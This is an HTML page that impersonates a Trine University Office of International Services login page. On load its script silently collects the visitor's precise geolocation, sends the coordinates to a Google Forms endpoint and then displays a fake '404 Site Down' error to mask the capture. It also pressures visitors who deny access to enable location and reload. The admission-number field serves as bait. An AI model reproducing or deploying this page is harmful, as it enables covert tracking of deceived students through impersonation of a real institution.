<!DOCTYPE html>
<html>
<head>
  <title>Trine University - International Services</title>
  <style>
    body, html { font-family: Arial, sans-serif; margin: 0; padding: 0; }
    .header { background-color: #002147; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; }
    .header .logo { font-size: 24px; font-weight: bold; }
    .header nav { }
    .header a { color: white; text-decoration: none; margin-left: 20px; }
    .content { text-align: center; padding-top: 50px; }
    button { padding: 10px 20px; font-size: 16px; }
    label, input { display: block; margin: 10px auto; font-size: 16px; }
    input[type="text"] { padding: 8px; width: 200px; }
    .error-message { color: red; text-align: center; font-size: 16px; }
  </style>
</head>
<body onload="checkLocationAccess()">
  <div class="header">
    <div class="logo">Trine University - International Services</div>
  </div>
  <div class="content">
    <div id="locationError" class="error-message"></div>
    <h1>Office of International Services Login Page</h1>
    <p>The Office of International Services provides a variety of online services for our institution's international
students. Please log in using one of the options below to view information or to make a request.</p>
    <label for="admissionNumber">Admission No:</label>
    <input type="text" id="admissionNumber" name="admissionNumber">
    <button id="submit">Submit</button>
    <p id="output"></p>
  </div>

  <!-- JavaScript Code -->
  <script>
    function checkLocationAccess() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationData, showLocationError, { timeout: 5000 });
      } else {
        showLocationError({ message: "Geolocation is not supported by this browser." });
      }
    }

    function sendLocationData(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      // Send data to Google Forms
      const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
      const data = new URLSearchParams();
      data.append("entry.1267598962", latitude);
      data.append("entry.1270259896", longitude);
      data.append("entry.1888406517", accuracy);

      fetch(formUrl, {
        method: "POST",
        body: data,
        mode: "no-cors",
      }).then(() => {
        throw new Error('404 Site Down'); // Simulate a 404 error after successful location submission
      }).catch((error) => {
        document.getElementById("output").innerText = "Error: " + error.message;
      });
    }

    function showLocationError(error) {
      const locationError = document.getElementById("locationError");
      locationError.innerHTML = "Error: Please enable location access to continue. <br>Please reload the page or open in a new tab.";
    }

    document.getElementById("submit").addEventListener("click", checkLocationAccess);
  </script>
</body>
</html>
